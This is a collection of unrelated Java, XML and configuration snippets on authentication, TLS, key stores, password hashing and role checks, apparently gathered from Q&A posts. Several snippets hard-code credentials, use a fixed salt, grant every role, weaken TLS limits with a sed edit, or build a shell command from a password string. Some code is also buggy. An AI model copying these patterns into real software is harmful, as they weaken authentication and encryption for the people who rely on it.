           if ("custom".equals(authenticator)) {
               return customAuthenticator.get();
            } else {
               return idmAuthenticator.get();
            }
       }
     }
---UNIQUEIDFORSNIP---|194111914|    authc = org.apache.shiro.web.filter.authc.PassThruAuthenticationFilter
---UNIQUEIDFORSNIP---|194111916|    Factory<SecurityManager> factory = new IniSecurityManagerFactory();
    SecurityManager securityManager = factory.getInstance();
    SecurityUtils.setSecurityManager(securityManager);
---UNIQUEIDFORSNIP---|194364033|    properties.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
    properties.put(Context.PROVIDER_URL, "LDAP://yourldap:389");
    properties.put(Context.SECURITY_PRINCIPAL, ldapqueryuser + "@yourldap");
    properties.put(Context.SECURITY_CREDENTIALS, ldapqueryuserpassword);
     
    // initializing active directory LDAP connection
    dirContext = new InitialDirContext(properties);
    dirContext.search(name, filter, cons)
---UNIQUEIDFORSNIP---|194558195|    /**
     * Given a plain text string writes an unquoted javascript string literal.
     *
     * @param s the plain text string to escape.
     * @param asciiOnly Makes sure that only ASCII characters are written to out.
     *     This is a good idea if you don't have control over the charset that
     *     the javascript will be served with.
     * @param embeddable True to make sure that nothing is written to out that
     *     could interfere with embedding inside a script tag or CDATA section, or
     *     other tag that typically contains markup.
     *     This does not make it safe to embed in an HTML attribute without
     *     further escaping.
     * @param out written to.
     */
    public static void escapeJsString(
        CharSequence s, boolean asciiOnly, boolean embeddable, Appendable out)
        throws IOException
---UNIQUEIDFORSNIP---|194580637|    KeyStore ks = KeyStore.getInstance("BKS");
    InputStream is = new FileInputStream("/etc/security/cacerts.bks");
    ks.load(is, "changeit".toCharArray());
    
    List<X509Certificate> certs = new ArrayList<X509Certificate>();
    Enumeration<String> aliases = ks.aliases();
    while (aliases.hasMoreElements()) {
      String alias = aliases.nextElement();
      X509Certificate cert = (X509Certificate) ks.getCertificate(alias);
      certs.add(cert);
    }
---UNIQUEIDFORSNIP---|194580640|    TrustManagerFactory tmf = TrustManagerFactory
                        .getInstance(TrustManagerFactory.getDefaultAlgorithm());
    tmf.init((KeyStore) null);
    X509TrustManager xtm = (X509TrustManager) tmf.getTrustManagers()[0];
    for (X509Certificate cert : xtm.getAcceptedIssuers()) {
        String certStr = "S:" + cert.getSubjectDN().getName() + "\nI:"
                            + cert.getIssuerDN().getName();
        Log.d(TAG, certStr);
    }
---UNIQUEIDFORSNIP---|194844805|    Principal userPrincipal = request.getUserPrincipal();
        
    if (userPrincipal != null) {   
        httpMessageContext.getHandler().handle(new Callback[] { 
                    new CallerPrincipalCallback(httpMessageContext.getClientSubject(), userPrincipal) }
                );
                
        return AuthenticationStatus.SUCCESS; 
    }
---UNIQUEIDFORSNIP---|195141871|    public static boolean isExecutable(File file) {
      byte[] firstBytes = new byte[4];
      try {
        FileInputStream input = new FileInputStream(file);
        input.read(firstBytes);
        // Check for Windows executable
        if (firstBytes[0] == 0x4d && firstBytes[1] == 0x5a) {
          return true;
        }
        return false;
      }
      catch (Exception e) {
        e.printStackTrace();
      }
    }
---UNIQUEIDFORSNIP---|195747663|    ..
    Trusted-Library: true
    X-COMMENT: Main-Class will be added automatically by build
    Trusted-Only: true
    ..
---UNIQUEIDFORSNIP---|195923405|    <meta http-equiv="refresh" content="#{session.maxInactiveInterval}"/>
---UNIQUEIDFORSNIP---|195923409|    <meta http-equiv="refresh" content="${pageContext.session.maxInactiveInterval}"/>
---UNIQUEIDFORSNIP---|195962502|    static {
            System.setProperty("javax.net.ssl.keyStoreType", "pkcs12"); // or whatever
            System.setProperty("javax.net.ssl.keyStore", "c:/folder/mycert.p12");
            System.setProperty("javax.net.ssl.keyStorePassword", "mypassword");
            System.setProperty("javax.net.debug", "ssl");
    }
---UNIQUEIDFORSNIP---|195973793|    protected void noHandlerFound(HttpServletRequest request, HttpServletResponse response) throws Exception {
        if (pageNotFoundLogger.isWarnEnabled()) {
            String requestUri = urlPathHelper.getRequestUri(request);
            pageNotFoundLogger.warn("No mapping found for HTTP request with URI [" + requestUri +"] in DispatcherServlet with name '" + getServletName() + "'");
        }
        response.sendError(HttpServletResponse.SC_NOT_FOUND);
    }
---UNIQUEIDFORSNIP---|195973796|    request.getRemoteAddr();
---UNIQUEIDFORSNIP---|196084145|    > Also, if some aspect of the certificate chain was unacceptable (e.g.,
    > it was not signed by a known, trusted CA), the server MAY at its
    > discretion either continue the handshake (considering the client
    > unauthenticated) or send a fatal alert.
    This gives some flexibility regarding what to do when a unacceptable certificate is sent. The JSSE chooses to send a fatal alert. (`setWantAuth` could in principle carry on with invalid certificates, but not treat the peer as authenticated, as if no client certificate was sent, but this isn't the case.)
    Previous versions of the TLS spec said "*If client authentication is required by the server for the handshake to continue, it may respond with a fatal handshake failure alert.*". This is the difference between need or want as implemented in the JSSE: using "need", the server responds with a fatal handshake failure, whereas using "want", the server carries on with the connection, but doesn't treat it as authenticated.
---UNIQUEIDFORSNIP---|196084150|        KeyManagerFactory kmf = //... Initialise a KMF with your server's keystore
        TrustManagerFactory tmf = TrustManagerFactory
            .getInstance(TrustManagerFactory.getDefaultAlgorithm());
        tmf.init((KeyStore) null); // Use the default trust store
        TrustManager[] trustManagers = tmf.getTrustManagers();
        final X509TrustManager origTrustManager = (X509TrustManager) trustManagers[0];
        final X509Certificate caCert = // Load your test CA certificate here.
        X509TrustManager fakeTrustManager = new X509TrustManager() {
            public void checkClientTrusted(X509Certificate[] chain,
                    String authType) throws CertificateException {
                // Key the behaviour of the default trust manager.
                origTrustManager.checkClientTrusted(chain, authType);
            }
            public void checkServerTrusted(X509Certificate[] chain,
                    String authType) throws CertificateException {
                // Key the behaviour of the default trust manager.
                origTrustManager.checkServerTrusted(chain, authType);
            }
            public X509Certificate[] getAcceptedIssuers() {
                // This is only used for sending the list of acceptable CA DNs.
                return new X509Certificate[] { caCert };
            }
        };
        trustManagers = new X509TrustManager[] { fakeTrustManager };
        SSLContext sslContext = SSLContext.getInstance("TLS");
        sslContext.init(kmf.getKeyManagers(), trustManagers, null);
    In this case, the `Certificate Request` message sent by the server should contain the your test CA's DN. However, that CA isn't actually trusted by the trust manager, which still uses the default values.
    The client will send its certificate, but the server will reject it, saying "javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path validation failed", and this will end the connection. This is at least the implementation using the SunJSSE provider, using the PKIX or SunX509 trust managers. This is also consistent with the [JSSE specification of the trust manager](http://docs.oracle.com/javase/7/docs/technotes/guides/security/jsse/JSSERefGuide.html#TrustManager): "*The primary responsibility of the TrustManager is to determine whether the presented authentication credentials should be trusted. If the credentials are not trusted, the connection will be terminated.*"
---UNIQUEIDFORSNIP---|196522429|    import android.util.Base64;
    
    import java.security.MessageDigest;
    import java.security.NoSuchAlgorithmException;
    import java.security.spec.KeySpec;
    
    import javax.crypto.SecretKeyFactory;
    import javax.crypto.spec.PBEKeySpec;
    
    /**
     * Created by sergi.castellsague on 04/05/2014.
     */
    public class SecurityManager
    {
    private static final int ITERATIONS = 1000;
    
    public enum HashMethod
    {
        PBKDF2(){
            @Override
            public String getHashString()
            {
                return "PBKDF2WithHmacSHA1";
            }
        }, SHA512(){
            @Override
            public String getHashString() {
                return "SHA-512";
            }
        }, SHA384() {
            @Override
            public String getHashString() {
                return "SHA-384";
            }
        }, SHA256() {
            @Override
            public String getHashString () {
                return "SHA-256";
            }
        }
        , SHA1()
        {
            @Override
            public String getHashString() {
                return "SHA-1";
            }
        };
        public abstract String getHashString();
    }
    public static HashMethod getAppropriateHash()
    {
        HashMethod method = null;
        if ( isPBKDFAvailable() )
        {
            method = HashMethod.PBKDF2;
        }
        else if( isDigestAvailable( HashMethod.SHA512.getHashString() ) )
        {
            method = HashMethod.SHA512;
        }
        else if( isDigestAvailable( HashMethod.SHA384.getHashString() ) )
        {
            method = HashMethod.SHA384;
        }
        else if( isDigestAvailable( HashMethod.SHA256.getHashString() ) )
        {
            method = HashMethod.SHA256;
        }
        else if( isDigestAvailable( HashMethod.SHA1.getHashString() ) )
        {
            method = HashMethod.SHA1;
        }
        return method;
    }
    private static boolean isPBKDFAvailable()
    {
        try
        {
            SecretKeyFactory.getInstance( HashMethod.PBKDF2.getHashString() );
        }
        catch ( Exception notAvailable)
        {
            return false;
        }
        return true;
    }
    private static boolean isDigestAvailable( String method )
    {
        try
        {
            MessageDigest.getInstance( method );
        }
        catch ( Exception notAvailable )
        {
            return false;
        }
        return true;
    }
    public static String getHashedPassword( HashMethod method, String password )
    {
        String hashed;
        if ( HashMethod.PBKDF2.getHashString().equals( method.getHashString() ) )
        {
            hashed = generatePBKDF( password );
        }
        else
        {
            hashed = password;
            for ( int i = 0; i < ITERATIONS; i++ )
            {
                hashed = generateDigestPassword( password, method.getHashString() );
            }
        }
        return hashed;
    }
    private static String generatePBKDF( String password )
    {
        // Generate a 512-bit key
        final int outputKeyLength = 512;
        char[] chars = new char[password.length()];
        password.getChars( 0, password.length(), chars, 0 );
        byte[] salt = "salt_on_client_is_funny".getBytes(); // In security terms, this is worthess. However, it's required.
        byte[] hashedPassBytes = new byte[0];
        try
        {
            SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance( HashMethod.PBKDF2.getHashString() );
            KeySpec keySpec = new PBEKeySpec( chars, salt, ITERATIONS, outputKeyLength );
            hashedPassBytes = secretKeyFactory.generateSecret( keySpec ).getEncoded();
        }
        catch ( Exception shouldNotHappen )
        {}
        return Base64.encodeToString( hashedPassBytes, Base64.DEFAULT );
    }
    private static String generateDigestPassword( String password, String algorithm )
    {
        byte[] digest = new byte[0];
        byte[] buffer = password.getBytes();
        try {
            MessageDigest messageDigest = MessageDigest.getInstance( algorithm );
            messageDigest.reset();
            messageDigest.update( buffer );
            digest = messageDigest.digest();
        }
        catch ( NoSuchAlgorithmException ex )
        {}
        return Base64.encodeToString(digest, Base64.DEFAULT);
    }
    }
---UNIQUEIDFORSNIP---|196522431|    String password = "BestPasswordEver123!!";
    SecurityManager.HashMethod hashMethod = SecurityManager.getAppropriateHash();
    SecurityManager.getHashedPassword( hashMethod, password )
---UNIQUEIDFORSNIP---|196612175|    jdk.tls.disabledAlgorithms= SSLv2Hello, SSLv3, TLSv1, TLSv1.1
---UNIQUEIDFORSNIP---|196639575|    int variable;
    for(int i=0; i++; i<4){
         variable+=i; //Compilation error, garbage or expected result, depending on language
    }
---UNIQUEIDFORSNIP---|196834534|    -Djava.security.debug=access,failure
---UNIQUEIDFORSNIP---|196963002|    callNoArgMethod("getSigningData", jar);
    makeHardLink("signingDataRef", jar);
    
    callNoArgMethod("getManifest", jar);
    makeHardLink("manRef", jar, n);
---UNIQUEIDFORSNIP---|197064761|    String salt = generateLongRandomString();
    String hashToStore = sha1(sha1(password) + salt);
---UNIQUEIDFORSNIP---|197100985|    // Build signed URI w/ encrypted signature (need only for the 'toSend' String)
    URI uriSigned = new URIBuilder(uri).setParameter("signature", signature).build();
    // This is what we actually POST, includes the encrypted signature. Seems hack-y.
    String toSend = uriSigned.toString().substring(uriSigned.toString().indexOf('?') + 1);
---UNIQUEIDFORSNIP---|197100987|    StringEntity se = new StringEntity("signature=" + URLEncoder.encode(signature, ENCODING));
---UNIQUEIDFORSNIP---|197100989|    POST / HTTP/1.1
    Key-Header: public_key_here
    Content-Type: application/something; utf8
    Content-Length: 19
    Host: 127.0.0.1
    User-Agent: Apache-HttpClient/4.5.6
    Accept-Encoding: gzip,deflate
    Connection: close
    
    signature=signature
---UNIQUEIDFORSNIP---|197260759|    (println (sb '(do
                    clojure.lang.RT
                    (RT/errPrintWriter))))
---UNIQUEIDFORSNIP---|197314896|    package myutil;
    
    import java.util.Iterator;
    
    import net.sf.json.JSONArray;
    
    import net.sf.json.JSONObject;
    
    import org.apache.commons.lang.StringEscapeUtils;
    
    public class JSONCleaner {
    	
    	public static void main(String[] args) {
    		// TODO Auto-generated method stub
    		JSONObject jsonchild2=new JSONObject();
    		jsonchild2.put("subchlidkey1", "subchildvalue1");
    		jsonchild2.put("subchlidkey2", "subchildvalue2");
    		jsonchild2.put("subchlidkey3", "subchildvalue3");
    		
    		JSONObject jsonchild=new JSONObject();
    		jsonchild.put("chlidkey1", "childvalue1");
    		jsonchild.put("chlidkey2", "childvalue2");
    		jsonchild.put("chlidkey3", "childvalue3");
    		
    		JSONArray jsonarray=new JSONArray();
    		jsonarray.add("option1");
    		jsonarray.add("<p>option2</p>");
    		jsonarray.add(jsonchild2);
    		
    		JSONObject json=new JSONObject();
    		json.put("name", "<b>nirbhay</b>");
    		json.put("age", 23);
    		json.put("jsonChildObject", jsonchild);
    		json.put("weight", 65);
    		json.put("array", jsonarray);
    		
    		System.out.println(cleanJSONObject(json));
    		//System.out.println(json.getString("name"));
    	}
    	
    	public static JSONObject cleanJSONObject(JSONObject jsonObject)
    	{
    		JSONObject returnJson=new JSONObject();
            Iterator<?> keys = jsonObject.keys();
            while( keys.hasNext() ){
                String key = (String)keys.next();
                //System.out.println(jsonObject.get(key));
                if(jsonObject.optJSONObject(key)==null)
                {
                	if(jsonObject.optJSONArray(key)!=null)
                	{
                	returnJson.put(key, cleanJSONArray(jsonObject.getJSONArray(key)));
                	}
                    else
                    {
                    	returnJson.put(key, StringEscapeUtils.escapeHtml(jsonObject.getString(key)));
                    }
                }
                else
                {
                	returnJson.put(key,cleanJSONObject(jsonObject.optJSONObject(key)));
                }
            }
    		
    		return returnJson;
    	}
    	
    	private static JSONArray cleanJSONArray(JSONArray array)
    	{
    		
    		JSONArray returnArray=new JSONArray();
    		for(int i=0,j=array.size();i<j;i++)
        	{
    			if(array.optJSONObject(i)==null)
    			{
    				if(array.optJSONArray(i) != null)
    				{
    	    		returnArray.add(cleanJSONArray((JSONArray) array.get(i)));
    				}
    				else
    				{
    					returnArray.add(StringEscapeUtils.escapeHtml(array.getString(i)));
    				}
    			}
    			else
    			{
    				returnArray.add(cleanJSONObject((JSONObject) array.get(i)));
    			}
        		
        	}
    		return returnArray;
    	}
    }
---UNIQUEIDFORSNIP---|197668983|    private ArrayList<X509Certificate> parseCerts( String fileName, String pwd ) {
       ArrayList certsFromP12File = new ArrayList();
       String cmdLine = "/usr/bin/openssl pkcs12 -info -in " + fileName + " -clcerts -nokeys -passin pass:" + pwd;
    
       String line;
    
       Process p = Runtime.getRuntime().exec( cmdLine );
    
       BufferedReader input = new BufferedReader( new InputStreamReader( p.getInputStream() ) );
    
       boolean readingCert = false;
       boolean gotCertToProcess = false;
       String certString;
    
       while ((line=input.readLine()) != null ) {
          if ( line.contains("-----BEGIN CERTIFICATE-----") ) {
             readingCert = true;
          }
          if ( readingCert ) {
             certString += line + System.getProperty("line.separator");
          }
          if ( line.contains("-----END CERTIFICATE-----") ) {
             readingCert = false;
             getCertToProcess = true;
          }
          if ( gotCertToProcess ) {
             X509Certificate cert = null;
             byte[] cert_bytes = certString.getBytes();
             ByteArrayInputStream certInputStream = new ByteArrayInputStream(cert_bytes);
             cert = (X509Certificate) CertificateFactory.getInstance("X509").generateCertificate( certInputStream );
             certsFromP12File.add( cert );
             gotCertToProcess = false;
             certString = "";
          }
       }
       input.close();
    
       return certsfromP12File;
    }
---UNIQUEIDFORSNIP---|197742287|    <bean id="proxyAuthenticationHandler"
          class="org.jasig.cas.authentication.handler.support.HttpBasedServiceCredentialsAuthenticationHandler"
          p:httpClient-ref="httpClient" p:requireSecure="false"/>
---UNIQUEIDFORSNIP---|198344812|request.getHeader("origin");
---UNIQUEIDFORSNIP---|198598144|    @DeclareRoles({"administrator","operator","user"})
    @PermitAll
    @Stateless
    public class myFacade {
    
        @PersistenceContext(unitName = "myPersistencePU")
        private EntityManager em;
    
        @Resource EJBContext securityContext;
    
        public DataStuff find(Object id) {
            //Now the securityContext is != null :-D
            String username = securityContext.getCallerPrincipal().getName();
            if(username.equals("gino"){
                return null;
            }
            return getEntityManager().find(entityClass, id);
        }
    }
---UNIQUEIDFORSNIP---|198762221|    @Override
    public Publisher<MutableHttpResponse<?>> doFilter(HttpRequest<?> theReq, ServerFilterChain theChain) {
        System.out.println("Filtering!");
        Publisher<MutableHttpResponse<?>> resp = secService.checkAuthorization(theReq)
                .switchMap((authResult) -> { // authResult - is you result from SecurityService
                    if (!authResult) {
                        return Publishers.just(HttpResponse.status(HttpStatus.FORBIDDEN)); // reject request
                    } else {
                        return theChain.proceed(theReq); // process request as usual
                    }
                })
                .doOnNext(res -> {
                    System.out.println("Responding!");
                });
        return (resp);
    }
---UNIQUEIDFORSNIP---|198991777|    HttpServletRequest request = (HttpServletRequest)PolicyContext.getContext("javax.servlet.http.HttpServletRequest")
---UNIQUEIDFORSNIP---|198991779|    HttpServletRequest request = (HttpServletRequest)PolicyContext.getContext(HttpServletRequest.class.getName())
---UNIQUEIDFORSNIP---|199013964|    <appender name="rolling.file.appender" class="org.apache.log4j.RollingFileAppender">
        <param name="maxFileSize" value="50MB" />
        <param name="maxBackupIndex" value="10" />
        <param name="file" value="${catalina.base}/logs/myApplication.log" />
        <layout class="org.apache.log4j.PatternLayout">
            <param name="ConversionPattern" value="%-5p: %c - %m%n" />
        </layout>
    </appender>
    
    <!-- Root Logger -->
    <root>
        <priority value="INFO" />
        <appender-ref ref="rolling.file.appender" />
    </root>
---UNIQUEIDFORSNIP---|199492021|    public class CustomJacksonProvider extends ResteasyJackson2Provider {
    
    }
---UNIQUEIDFORSNIP---|199492024|    Keycloak kc = KeycloakBuilder.builder()
    .realm("master")
    .clientId("admin-cli")
    .username("admin")
    .password("password")
    .serverUrl("http://localhost:8880/auth")
    .resteasyClient(new ResteasyClientBuilder().connectionPoolSize(10).register(new CustomJacksonProvider()).build())
    .build();
---UNIQUEIDFORSNIP---|199497147|    public static void main(String[] args) throws UnsupportedEncodingException {
       AESKeyGenerator aes = new AESKeyGenerator();
       String sharedKey = "Bar12345Bar12345Bar12345Bar12345";
       aes.generate_r(sharedKey.getBytes("US-ASCII"), "Hello World");
    }
---UNIQUEIDFORSNIP---|200066358|    @Override
    public void configure(WebSecurity web) throws Exception {
        web.ignoring().antMatchers(HttpMethod.POST, SecurityConstants.SIGN_UP_URL);
    }
---UNIQUEIDFORSNIP---|200069154|    requestContext.setSecurityContext(new SecurityContext() {
        @Override
        public Principal getUserPrincipal() {
            return new Principal() {
                @Override
                public String getName() {
                    return username;
                }
            };
        }
        @Override
        public boolean isUserInRole(String role) {
            return true;
        }
        @Override
        public boolean isSecure() {
            return false;
        }
        @Override
        public String getAuthenticationScheme() {
            return null;
        }
    });
---UNIQUEIDFORSNIP---|200069157|    @Path("/example")
    public class MyResource {
        @Context
        private SecurityContext securityContext;
        
        ...
    }
---UNIQUEIDFORSNIP---|200069160|    @GET
    @Path("/{id}")
    @Produces(MediaType.APPLICATION_JSON)
    public Response myResourceMethod(@PathParam("id") Long id, 
                                     @Context SecurityContext securityContext) {
        ...
    }
    
---UNIQUEIDFORSNIP---|200069163|    Principal principal = securityContext.getUserPrincipal();
    String username = principal.getName();
---UNIQUEIDFORSNIP---|200217822|    Cipher output = Cipher.getInstance("RSA/ECB/PKCS1Padding");
---UNIQUEIDFORSNIP---|200387254|    <%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8"%>
    <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
    <%@ taglib prefix="sec" uri="http://www.springframework.org/security/tags"%>
    
    <sec:authentication property="principal" var="auth" scope="session" />
    
    <html>
    <body>
    <h2>Hello World!</h2>
    <h2>${auth }</h2>
    <form action="<c:url value='/login' />" method="POST">
    	Username：<input type="text" name="username" /><br/>
    	Password：<input type="password" name="password" /><br/>
    	<input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/> <br/>
    	<input type="submit" value="Login" />
    </form>
    </body>
    </html>
---UNIQUEIDFORSNIP---|200433761|    public class PreAuthorizeChecker implements HandlerInterceptor {
    
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            if (handler instanceof HandlerMethod) {
                HandlerMethod hm = (HandlerMethod) handler;
                PreAuthorize annotation = AnnotationUtils.findAnnotation(hm.getMethod(), PreAuthorize.class);
                if (annotation == null) {
                    // prevent access to method wihout security restrictions
                    throw new RuntimeException("Rights are not defined for this handler");
                }
    
            }
            return true;
        }
    .....
    }
---UNIQUEIDFORSNIP---|200636151|    @ComponentScan   
    @SpringBootApplication
    public class Application extends SpringBootServletInitializer implements WebApplicationInitializer {
    
       public static void main(String[] args) {
          SpringApplication.run(Application.class, args);
       }
    
       @Override
       protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {
          return builder.sources(Application.class);
       }
    }
    
---UNIQUEIDFORSNIP---|200636155|    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
             xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
             metadata-complete="false" version="3.0">
    
        <security-constraint>
            <web-resource-collection>
                <web-resource-name>portal</web-resource-name>
                <description>This is the protected area of the application.</description>
                <url-pattern>/*</url-pattern>
            </web-resource-collection>
            <auth-constraint>
                <description>Requires users to be authenticated but does not require them to be authorized.</description>
                <role-name>*</role-name>
            </auth-constraint>
            <user-data-constraint>
                <description>Encryption is not required for this area.</description>
                <transport-guarantee>NONE</transport-guarantee>
            </user-data-constraint>
        </security-constraint>
        
    </web-app>
---UNIQUEIDFORSNIP---|200986210|    public class MyApi {
        final String myUrl;
        public MyApi(String urlString) {
            // Verify that urlString points to an approved server
            if (!checkApprovedUrl(urlString)) throw new IllegalArgumentException();
            myUrl = urlString;
        }
    }
---UNIQUEIDFORSNIP---|201188055|    import java.security.*;
    import java.security.cert.*;
    import java.security.interfaces.*;
    import java.security.spec.*;
    import javax.crypto.*;
    import javax.crypto.interfaces.*;
    import javax.crypto.spec.*;
    import java.io.*;
    /**
     *	AES
     */
    public class SymmetricAES {
        
        public SymmetricAES() {
        }
        
        public static void main(String args[]){
            BufferedReader ch = new BufferedReader(new InputStreamReader(System.in));
            char[] toCode;
            byte[] toCode2;
            byte[] Coded;
            char[] Coded2;
            byte[] decoded;
            char[] deco2;
            
            try{
                System.out.print("Text to Encrypt : ");
                String toMake = ch.readLine();
                
                /** Arxikopoihsh antikeimenou KeyGenerator gia AES
                 * 	kai dhmhourgia Kleidioy */
                KeyGenerator keyGen = KeyGenerator.getInstance("AES");
                SecretKey aesKey = keyGen.generateKey();
                
                /* Arxikopoihsh aesCipher gia AES */
                Cipher aesCipher = Cipher.getInstance("AES");
                
                /* Orismos aesCipher se ENCRYPT_MODE me to aesKey */
                aesCipher.init(Cipher.ENCRYPT_MODE, aesKey);
                System.out.println("The Key : " + aesKey.getEncoded());
                
                /* Metatroph antikeimenou String se pinaka Char
                 * kai o ka8e xarakthras gineta Cast se Byte kai eisagwgh
                 * se pinaka Byte isou mege8ous me ton prwto pinaka */
                toCode = toMake.toCharArray();
                toCode2 = new byte[toCode.length];
                Coded = new byte[toCode.length];
                for(int i=0;i<toCode.length;i++)
                    toCode2[i] = (byte)toCode[i];
                    
                /* Teliko stadio Kryptografhshs */
                Coded = aesCipher.doFinal(toCode2);
                
                /* byte[] --> char[] kai ektypwsh*/
                Coded2 = new char[Coded.length];
                for(int i=0;i<Coded.length;i++)
                    Coded2[i] = (char)Coded[i];
                System.out.println("Test Encrypt: " + new String(Coded2));
                
                
                Cipher aesCipher2 = Cipher.getInstance("AES");
                
                /* Orismos aesCipher2 se DECRYPT_MODE me to aesKey */
                aesCipher2.init(Cipher.DECRYPT_MODE, aesKey);
                
                decoded = aesCipher2.doFinal(Coded);
                
                /* byte[] --> char[] kai ektypwsh*/
                deco2 = new char[decoded.length];
                for(int i=0;i<decoded.length;i++)
                    deco2[i] = (char)decoded[i];
                System.out.println("Test Decrypt: " + new String(deco2));
            }
            catch(Exception e){
                System.out.println(e);
            }   
        }
    }
---UNIQUEIDFORSNIP---|201202833|    <session-config>
        <cookie-config>
            <http-only>true</http-only>
            <secure>true</secure>
        </cookie-config>
    </session-config>
---UNIQUEIDFORSNIP---|201310633|    public static UUID randomUUID() {
            SecureRandom ng = numberGenerator;
            if (ng == null) {
                numberGenerator = ng = new SecureRandom();
            }
    
            byte[] randomBytes = new byte[16];
            ng.nextBytes(randomBytes);
            randomBytes[6]  &= 0x0f;  /* clear version        */
            randomBytes[6]  |= 0x40;  /* set to version 4     */
            randomBytes[8]  &= 0x3f;  /* clear variant        */
            randomBytes[8]  |= 0x80;  /* set to IETF variant  */
            return new UUID(randomBytes);
        }
---UNIQUEIDFORSNIP---|201431979|               Security.addProvider(new BouncyCastleProvider());
               Security.addProvider(new BouncyCastlePQCProvider());
---UNIQUEIDFORSNIP---|201617164|    String sha256 = yourSha256Calculation();
    sha256.substring(0,10);
---UNIQUEIDFORSNIP---|201648793|     <security-constraint>
        <web-resource-collection>
          <web-resource-name>DESC_OF_FOLDER</web-resource-name>
          <url-pattern>/users/*</url-pattern>
        </web-resource-collection>
        <auth-constraint>
          <role-name>REGISTERED_USER_ROLE</role-name>
        </auth-constraint>
      </security-constraint>
---UNIQUEIDFORSNIP---|201648796|      <filter> 
        <filter-name>prePost</filter-name>
        <display-name>prePost</display-name>
        <filter-class>com.acme.filter.PrePostFilter</filter-class> 
      </filter> 
      <filter-mapping> 
        <filter-name>prePost</filter-name>
        <url-pattern>/denial</url-pattern> 
      </filter-mapping> 
---UNIQUEIDFORSNIP---|201710239|    jdk.tls.disabledAlgorithms=SSLv3, RC4, MD5withRSA, DH keySize < 1024, \
---UNIQUEIDFORSNIP---|201710241|    jdk.tls.disabledAlgorithms=SSLv3, RC4, MD5withRSA, DH keySize < 768, \
---UNIQUEIDFORSNIP---|201710243|    $ sed -i "s/ DH keySize < 1024,//" /usr/lib/jvm/default-java/jre/lib/security/java.security
---UNIQUEIDFORSNIP---|201930311|    <safRoleMapper profilePattern="myprofile.%resource%.%role%" toUpperCase="true" />
---UNIQUEIDFORSNIP---|201930320|    myprofile.myapp.admin
---UNIQUEIDFORSNIP---|201930329|    <% if (request.isUserInRole("role")) { %>
      <!-- Content to display for users in role 'role' -->
    <% } %>
---UNIQUEIDFORSNIP---|202108177|    -Djava.security.debug=access,failure
---UNIQUEIDFORSNIP---|202108180|    -Djava.security.debug=policy
---UNIQUEIDFORSNIP---|202108183|    -Djava.security.debug=access,failure,policy
---UNIQUEIDFORSNIP---|202156808|    String hashed = BCrypt.hashpw("dog", BCrypt.gensalt(12));
    String candidate = "dog";
    if (BCrypt.checkpw(candidate, hashed)) {
        Toast.makeText(Loader.this, "equals", Toast.LENGTH_LONG).show();
    } else {
        Toast.makeText(Loader.this, "doesn't match?", Toast.LENGTH_LONG).show();
    }
---UNIQUEIDFORSNIP---|202184592|    @PowerMockIgnore("javax.net.ssl.*")
---UNIQUEIDFORSNIP---|202280336|     public class SecurityHelper {
         public static boolean isAuthenticated(){
	      Subject currentUser = SecurityUtils.getSubject();
	      return currentUser.isAuthenticated();
         }
         public static void checkPermission(String permissionCode){
              Subject currentUser = SecurityUtils.getSubject();
              currentUser.checkPermission(permissionCode);
         }
         public static void checkPermission(String... permissionCodes){
              Subject currentUser = SecurityUtils.getSubject();
              currentUser.checkPermissions(permissionCodes);
         }
         ... and so on
---UNIQUEIDFORSNIP---|202428508|    <form:select path="plantId">
        <form:option value="0" label="--- Select ---" />
        <c:forEach var="thePlant" items="${plants}">
            <security:authorize access="hasRole('ROLE_'+${thePlant.type})">
                <form:option value="${thePlant.plantId.toString()}"><c:out value="${thePlant.name}"/></form:option>
            </security:authorize>
        </c:forEach>
    </form:select>
---UNIQUEIDFORSNIP---|202436224|    package com.company.testjar;
    
    public class TestClass {
    	private int value;
    	
    	public TestClass(final int value) {
    		this.value = value;
    	}
    	
    	public int GetValue() {
    		return value;
    	}
    }
---UNIQUEIDFORSNIP---|202436226|    package com.company.testjar2;
    
    public class TestClass2 {
    	private int value;
        	
    	public TestClass2(final int value) {
       		this.value = value;
       	}
        	
       	public int GetValue() {
       		return value;
       	}
    }
---UNIQUEIDFORSNIP---|202436230|    package com.company.testjar;
    
    public class Bogus {
    	private String value;
    	
    	public Bogus(final String value) {
    		this.value = value;
    	}
    	
    	public String GetValue() {
    		return value;
    	}
    }
---UNIQUEIDFORSNIP---|202436232|    package com.company.testjar.subpackage;
    
    public class SubBogus {
    	private String value;
    	
    	public SubBogus(final String value) {
    		this.value = value;
    	}
    	
    	public String GetValue() {
    		return value;
    	}
    }
---UNIQUEIDFORSNIP---|202436239|    package com.company.testjar;
    
    public class TestClass {
    }
---UNIQUEIDFORSNIP---|202436241|    package com.company.testjar2;
    
    public class TestClass2 {
    }
---UNIQUEIDFORSNIP---|202436243|    Manifest-Version: 1.0
    Ant-Version: Apache Ant 1.9.3
    Created-By: 1.8.0_40-b26 (Oracle Corporation)
    Implementation-Vendor: Company
    Implementation-Title: Test Jar
    Implementation-Version: 6.4.0.0
    Sealed: true
---UNIQUEIDFORSNIP---|202436245|    package com.company.testjar;
    
    public class Bogus {
    }
---UNIQUEIDFORSNIP---|202436247|    package com.company.testjar.subpackage;
    
    public class SubBogus {
    }
---UNIQUEIDFORSNIP---|202436249|    package com.company;
    
    public class ParentBogus {
    }
---UNIQUEIDFORSNIP---|202436251|    package com.company.test;
    
    import static org.junit.Assert.*;
    
    import org.junit.Test;
    
    import com.company.ParentBogus;
    import com.company.testjar.Bogus;
    import com.company.testjar.TestClass;
    import com.company.testjar.subpackage.SubBogus;
    import com.company.testjar2.TestClass2;
    
    /**
     * A set of tests for testing the effects of .jar sealing.
     * 
     * These tests rely on a built .jar named TestJar.jar which is built from the command line.
     * 
